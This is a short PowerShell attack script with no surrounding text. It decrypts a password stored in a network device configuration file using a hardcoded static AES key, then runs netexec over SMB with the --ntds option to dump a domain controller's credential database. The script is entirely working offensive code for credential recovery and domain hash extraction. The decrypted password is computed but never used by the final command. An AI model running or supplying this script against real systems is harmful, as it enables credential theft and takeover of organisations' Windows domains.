param([string]$config, [string]$server, [string]$user, [string]$password)
$entry = [regex]::Match($config, 'set (?:password|passwd) ENC (\S+)')
$raw = [Convert]::FromBase64String($entry.Groups[1].Value)
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = [System.Text.Encoding]::ASCII.GetBytes('Mary had a littl')
$iv = New-Object byte[] 16
[Array]::Copy($raw, 0, $iv, 0, 4)
$aes.IV = $iv
$aes.Padding = 'None'
$decryptor = $aes.CreateDecryptor()
$plaintext = $decryptor.TransformFinalBlock($raw, 4, $raw.Length - 4)
& netexec.exe smb $server -u $user -p $password --ntds
